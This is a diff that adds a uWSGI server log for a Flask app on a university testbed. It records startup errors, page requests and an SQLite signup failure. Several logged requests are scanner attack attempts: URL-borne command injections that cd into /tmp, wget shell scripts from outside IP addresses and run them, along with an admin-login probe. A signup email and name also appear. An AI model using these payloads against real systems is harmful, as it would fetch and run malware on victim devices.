@@ -1,0 +1,722 @@
+*** Starting uWSGI 2.0.20 (64bit) on [Tue Sep 27 11:47:18 2022] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-44) on 01 September 2022 18:44:33
+os: Linux-3.10.0-1160.71.1.el7.x86_64 #1 SMP Tue Jun 28 15:37:28 UTC 2022
+nodename: testbed.central.edu.gh
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 4
+current working directory: /home/testbuser/Projects/myrproject
+detected binary path: /home/testbuser/Projects/myrproject/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your processes number limit is 39255
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address myrproject.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.8 (default, Nov 16 2020, 16:55:22)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xda4910
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 437424 bytes (427 KB) for 5 cores
+*** Operational MODE: preforking ***
+Traceback (most recent call last):
+  File "./wsgi.py", line 1, in <module>
+    from app import application
+  File "./app.py", line 3, in <module>
+    from PIL import Image
+ModuleNotFoundError: No module named 'PIL'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 15017)
+spawned uWSGI worker 1 (pid: 15018, cores: 1)
+spawned uWSGI worker 2 (pid: 15019, cores: 1)
+spawned uWSGI worker 3 (pid: 15020, cores: 1)
+spawned uWSGI worker 4 (pid: 15021, cores: 1)
+spawned uWSGI worker 5 (pid: 15022, cores: 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 15018|app: -1|req: -1/1] 45.222.128.252 () {40 vars in 656 bytes} [Tue Sep 27 11:47:27 2022] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+SIGINT/SIGTERM received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket myrproject.sock removed.
+*** Starting uWSGI 2.0.20 (64bit) on [Tue Sep 27 11:54:12 2022] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-44) on 01 September 2022 18:44:33
+os: Linux-3.10.0-1160.71.1.el7.x86_64 #1 SMP Tue Jun 28 15:37:28 UTC 2022
+nodename: testbed.central.edu.gh
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 4
+current working directory: /home/testbuser/Projects/myrproject
+detected binary path: /home/testbuser/Projects/myrproject/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your processes number limit is 39255
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address myrproject.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.8 (default, Nov 16 2020, 16:55:22)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x265b910
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 437424 bytes (427 KB) for 5 cores
+*** Operational MODE: preforking ***
+/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_marshmallow/__init__.py:27: UserWarning: Flask-SQLAlchemy integration requires marshmallow-sqlalchemy to be installed.
+  "Flask-SQLAlchemy integration requires "
+/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_sqlalchemy/__init__.py:873: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.
+  'SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and '
+Traceback (most recent call last):
+  File "./wsgi.py", line 1, in <module>
+    from app import application
+ImportError: cannot import name 'application'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 15352)
+spawned uWSGI worker 1 (pid: 15356, cores: 1)
+spawned uWSGI worker 2 (pid: 15357, cores: 1)
+spawned uWSGI worker 3 (pid: 15358, cores: 1)
+spawned uWSGI worker 4 (pid: 15359, cores: 1)
+spawned uWSGI worker 5 (pid: 15360, cores: 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 15359|app: -1|req: -1/1] 45.222.128.252 () {40 vars in 656 bytes} [Tue Sep 27 11:54:17 2022] GET / => generated 21 bytes in 2 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 15359|app: -1|req: -1/2] 45.222.128.252 () {40 vars in 656 bytes} [Tue Sep 27 11:54:18 2022] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+*** Starting uWSGI 2.0.20 (64bit) on [Mon Oct 10 02:58:07 2022] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-44) on 01 September 2022 18:44:33
+os: Linux-3.10.0-1160.71.1.el7.x86_64 #1 SMP Tue Jun 28 15:37:28 UTC 2022
+nodename: testbed.central.edu.gh
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 4
+current working directory: /home/testbuser/Projects/myrproject
+detected binary path: /home/testbuser/Projects/myrproject/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your processes number limit is 39255
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address myrproject.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.8 (default, Nov 16 2020, 16:55:22)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xe0d910
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 437424 bytes (427 KB) for 5 cores
+*** Operational MODE: preforking ***
+/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_marshmallow/__init__.py:27: UserWarning: Flask-SQLAlchemy integration requires marshmallow-sqlalchemy to be installed.
+  "Flask-SQLAlchemy integration requires "
+/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_sqlalchemy/__init__.py:873: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.
+  'SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and '
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xe0d910 pid: 17320 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 17320)
+spawned uWSGI worker 1 (pid: 17324, cores: 1)
+spawned uWSGI worker 2 (pid: 17325, cores: 1)
+spawned uWSGI worker 3 (pid: 17326, cores: 1)
+spawned uWSGI worker 4 (pid: 17327, cores: 1)
+spawned uWSGI worker 5 (pid: 17328, cores: 1)
+[pid: 17328|app: 0|req: 1/1] 154.160.17.80 () {40 vars in 655 bytes} [Mon Oct 10 02:58:23 2022] GET / => generated 5013 bytes in 48 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 2/2] 154.160.17.80 () {42 vars in 765 bytes} [Mon Oct 10 02:58:23 2022] GET /style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 1/3] 154.160.17.80 () {42 vars in 785 bytes} [Mon Oct 10 02:58:24 2022] GET /static/css/land.css => generated 2110 bytes in 10 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 2/4] 154.160.17.80 () {42 vars in 852 bytes} [Mon Oct 10 02:58:24 2022] GET /static/img/Central-Uni-logo.png => generated 444470 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 3/5] 154.160.17.80 () {42 vars in 828 bytes} [Mon Oct 10 02:58:25 2022] GET /static/img/visa.png => generated 72545 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 3/6] 154.160.17.80 () {42 vars in 828 bytes} [Mon Oct 10 02:58:25 2022] GET /static/img/gpay.png => generated 478257 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 256 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 4/7] 154.160.17.80 () {42 vars in 852 bytes} [Mon Oct 10 02:58:25 2022] GET /static/img/2000px-Apple_Pay.png => generated 33719 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 267 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 1/8] 154.160.17.80 () {42 vars in 832 bytes} [Mon Oct 10 02:58:25 2022] GET /static/img/qrcode.png => generated 320662 bytes in 28 msecs via sendfile() (HTTP/1.1 200) 7 headers in 258 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 1/9] 154.160.17.80 () {42 vars in 826 bytes} [Mon Oct 10 02:58:25 2022] GET /static/img/mkk.png => generated 114135 bytes in 11 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 5/10] 154.160.17.80 () {42 vars in 840 bytes} [Mon Oct 10 02:58:25 2022] GET /static/img/mastercard.png => generated 105021 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 262 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 6/11] 154.160.26.32 () {40 vars in 718 bytes} [Mon Oct 10 03:00:05 2022] GET / => generated 5013 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 1/12] 154.160.26.32 () {42 vars in 776 bytes} [Mon Oct 10 03:00:06 2022] GET /static/css/land.css => generated 2110 bytes in 19 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 7/13] 154.160.26.32 () {42 vars in 756 bytes} [Mon Oct 10 03:00:06 2022] GET /style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 8/14] 154.160.26.32 () {42 vars in 846 bytes} [Mon Oct 10 03:00:06 2022] GET /static/img/Central-Uni-logo.png => generated 444470 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 2/15] 154.160.26.32 () {42 vars in 820 bytes} [Mon Oct 10 03:00:07 2022] GET /static/img/mkk.png => generated 114135 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 4/16] 154.160.26.32 () {42 vars in 846 bytes} [Mon Oct 10 03:00:07 2022] GET /static/img/2000px-Apple_Pay.png => generated 33719 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 7 headers in 267 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 3/17] 154.160.26.32 () {42 vars in 822 bytes} [Mon Oct 10 03:00:07 2022] GET /static/img/gpay.png => generated 478257 bytes in 7 msecs via sendfile() (HTTP/1.1 200) 7 headers in 256 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 2/18] 154.160.26.32 () {42 vars in 826 bytes} [Mon Oct 10 03:00:07 2022] GET /static/img/qrcode.png => generated 320662 bytes in 7 msecs via sendfile() (HTTP/1.1 200) 7 headers in 258 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 5/19] 154.160.26.32 () {42 vars in 822 bytes} [Mon Oct 10 03:00:07 2022] GET /static/img/visa.png => generated 72545 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 2/20] 154.160.26.32 () {42 vars in 834 bytes} [Mon Oct 10 03:00:09 2022] GET /static/img/mastercard.png => generated 105021 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 262 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 4/21] 154.160.26.32 () {42 vars in 806 bytes} [Mon Oct 10 03:00:12 2022] GET /favicon.ico => generated 232 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 5/22] 154.160.26.32 () {44 vars in 908 bytes} [Mon Oct 10 03:00:54 2022] GET /userlogin => generated 3140 bytes in 29 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 9/23] 154.160.26.32 () {42 vars in 813 bytes} [Mon Oct 10 03:00:55 2022] GET /static/css/newstyle.css => generated 3386 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 272 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 3/24] 154.160.26.32 () {42 vars in 853 bytes} [Mon Oct 10 03:00:57 2022] GET /static/img/user.jpeg => generated 56377 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 257 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 10/25] 3.17.65.249 () {48 vars in 878 bytes} [Mon Oct 10 03:02:35 2022] POST /boaform/admin/formLogin => generated 232 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 156 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 4/26] 154.160.17.80 () {42 vars in 789 bytes} [Mon Oct 10 03:07:13 2022] GET / => generated 5013 bytes in 38 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 11/27] 154.160.17.80 () {44 vars in 860 bytes} [Mon Oct 10 03:07:13 2022] GET /static/css/land.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 5/28] 154.160.17.80 () {44 vars in 927 bytes} [Mon Oct 10 03:07:13 2022] GET /static/img/Central-Uni-logo.png => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 6/29] 154.160.17.80 () {44 vars in 915 bytes} [Mon Oct 10 03:07:13 2022] GET /static/img/mastercard.png => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 177 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 3/30] 154.160.17.80 () {44 vars in 903 bytes} [Mon Oct 10 03:07:13 2022] GET /static/img/visa.png => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 6/31] 154.160.17.80 () {44 vars in 907 bytes} [Mon Oct 10 03:07:13 2022] GET /static/img/qrcode.png => generated 0 bytes in 6 msecs (HTTP/1.1 304) 4 headers in 173 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 4/32] 154.160.17.80 () {42 vars in 785 bytes} [Mon Oct 10 03:07:14 2022] GET /style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 6/33] 154.160.17.80 () {44 vars in 901 bytes} [Mon Oct 10 03:07:14 2022] GET /static/img/mkk.png => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 170 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 5/34] 154.160.17.80 () {44 vars in 903 bytes} [Mon Oct 10 03:07:14 2022] GET /static/img/gpay.png => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 12/35] 154.160.17.80 () {44 vars in 927 bytes} [Mon Oct 10 03:07:14 2022] GET /static/img/2000px-Apple_Pay.png => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 6/36] 18.222.145.203 () {40 vars in 570 bytes} [Mon Oct 10 03:17:08 2022] GET / => generated 5013 bytes in 34 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 7/37] 128.1.248.42 () {34 vars in 498 bytes} [Mon Oct 10 03:18:06 2022] GET /solr/ => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 13/38] 103.147.6.76 () {32 vars in 471 bytes} [Mon Oct 10 03:46:03 2022] GET / => generated 5013 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 7/39] 80.94.92.231 () {28 vars in 311 bytes} [Mon Oct 10 03:54:24 2022] GET / => generated 5013 bytes in 24 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 8/40] 185.174.137.14 () {48 vars in 911 bytes} [Mon Oct 10 04:52:48 2022] GET / => generated 5013 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 309 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 7/41] 195.178.120.86 () {28 vars in 313 bytes} [Mon Oct 10 05:29:02 2022] GET / => generated 5013 bytes in 42 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17325|app: 0|req: 9/42] 195.178.120.86 () {36 vars in 649 bytes} [Mon Oct 10 05:29:02 2022] GET /cgi-bin/;cd+%2Ftmp%3Bwget+http%3A%2F%2F45.95.55.214%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+Netgear%3Brm+-rf+wget.sh => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+Mon Oct 10 05:35:12 2022 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws (ip 5.200.132.225) !!!
+Mon Oct 10 05:35:12 2022 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws (5.200.132.225)
+OSError: write error
+[pid: 17327|app: 0|req: 8/43] 5.200.132.225 () {34 vars in 575 bytes} [Mon Oct 10 05:35:12 2022] GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws => generated 0 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 0 bytes (0 switches on core 0)
+Mon Oct 10 06:32:33 2022 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws (ip 197.37.246.18) !!!
+Mon Oct 10 06:32:33 2022 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws (197.37.246.18)
+OSError: write error
+[pid: 17327|app: 0|req: 9/44] 197.37.246.18 () {34 vars in 575 bytes} [Mon Oct 10 06:32:33 2022] GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws => generated 0 bytes in 15 msecs (HTTP/1.1 404) 3 headers in 0 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 10/45] 195.178.120.86 () {28 vars in 313 bytes} [Mon Oct 10 06:57:51 2022] GET / => generated 5013 bytes in 27 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 14/46] 195.178.120.86 () {36 vars in 649 bytes} [Mon Oct 10 06:57:51 2022] GET /cgi-bin/;cd+%2Ftmp%3Bwget+http%3A%2F%2F45.95.55.214%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+Netgear%3Brm+-rf+wget.sh => generated 232 bytes in 15 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 10/47] 71.6.232.4 () {34 vars in 486 bytes} [Mon Oct 10 07:08:21 2022] GET / => generated 5013 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 11/48] 154.160.22.71 () {40 vars in 688 bytes} [Mon Oct 10 07:22:29 2022] GET / => generated 5013 bytes in 27 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 15/49] 154.160.22.71 () {42 vars in 798 bytes} [Mon Oct 10 07:22:29 2022] GET /style.css => generated 232 bytes in 20 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 8/50] 154.160.22.71 () {42 vars in 818 bytes} [Mon Oct 10 07:22:29 2022] GET /static/css/land.css => generated 2110 bytes in 25 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 16/51] 154.160.22.71 () {42 vars in 907 bytes} [Mon Oct 10 07:22:29 2022] GET /static/img/Central-Uni-logo.png => generated 444470 bytes in 10 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 12/52] 154.160.22.71 () {42 vars in 881 bytes} [Mon Oct 10 07:22:30 2022] GET /static/img/mkk.png => generated 114135 bytes in 8 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 13/53] 154.160.22.71 () {42 vars in 883 bytes} [Mon Oct 10 07:22:31 2022] GET /static/img/gpay.png => generated 478257 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 7 headers in 256 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 17/54] 154.160.22.71 () {42 vars in 883 bytes} [Mon Oct 10 07:22:31 2022] GET /static/img/visa.png => generated 72545 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 14/55] 154.160.22.71 () {42 vars in 887 bytes} [Mon Oct 10 07:22:31 2022] GET /static/img/qrcode.png => generated 320662 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 7 headers in 258 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 18/56] 154.160.22.71 () {42 vars in 907 bytes} [Mon Oct 10 07:22:31 2022] GET /static/img/2000px-Apple_Pay.png => generated 33719 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 267 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 19/57] 154.160.22.71 () {42 vars in 895 bytes} [Mon Oct 10 07:22:31 2022] GET /static/img/mastercard.png => generated 105021 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 262 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 11/58] 154.160.22.71 () {36 vars in 597 bytes} [Mon Oct 10 07:22:31 2022] GET /favicon.ico => generated 232 bytes in 16 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 20/59] 154.160.22.71 () {44 vars in 878 bytes} [Mon Oct 10 07:23:49 2022] GET /userlogin => generated 3140 bytes in 26 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 21/61] 154.160.22.71 () {42 vars in 855 bytes} [Mon Oct 10 07:23:49 2022] GET /static/css/newstyle.css => generated 3386 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 272 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 15/61] 154.160.22.71 () {42 vars in 914 bytes} [Mon Oct 10 07:23:49 2022] GET /static/img/user.jpeg => generated 56377 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 257 bytes (0 switches on core 0)
+try
+None
+None
+[pid: 17327|app: 0|req: 16/62] 154.160.22.71 () {44 vars in 890 bytes} [Mon Oct 10 07:23:54 2022] GET /login => generated 1687 bytes in 36 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 12/63] 154.160.22.71 () {42 vars in 823 bytes} [Mon Oct 10 07:23:54 2022] GET /style.css => generated 232 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 9/64] 154.160.22.71 () {42 vars in 847 bytes} [Mon Oct 10 07:23:54 2022] GET /static/css/stylee.css => generated 2763 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 270 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 10/65] 154.160.22.71 () {44 vars in 898 bytes} [Mon Oct 10 07:26:31 2022] GET /userlogin => generated 3140 bytes in 26 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 17/66] 154.160.22.71 () {44 vars in 969 bytes} [Mon Oct 10 07:26:31 2022] GET /static/img/user.jpeg => generated 0 bytes in 7 msecs (HTTP/1.1 304) 4 headers in 172 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 7/67] 154.160.22.71 () {44 vars in 910 bytes} [Mon Oct 10 07:26:31 2022] GET /static/css/newstyle.css => generated 0 bytes in 25 msecs (HTTP/1.1 304) 4 headers in 175 bytes (0 switches on core 0)
+None
+None
+None
+[pid: 17325|app: 0|req: 13/68] 154.160.22.71 () {44 vars in 909 bytes} [Mon Oct 10 07:26:34 2022] GET /usersignup => generated 3404 bytes in 39 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 22/69] 154.160.22.71 () {44 vars in 911 bytes} [Mon Oct 10 07:26:34 2022] GET /static/css/newstyle.css => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 175 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 23/70] 154.160.22.71 () {44 vars in 970 bytes} [Mon Oct 10 07:26:34 2022] GET /static/img/user.jpeg => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 172 bytes (0 switches on core 0)
+Int20013559
+eben@gmail.com
+Ebenmills 
+Success
+[2022-10-10 07:27:07,875] ERROR in app: Exception on /usersignup [POST]
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlite3.OperationalError: no such table: alumni
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "./app.py", line 500, in usersignup
+    db.session.commit()
+  File "<string>", line 2, in commit
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 1451, in commit
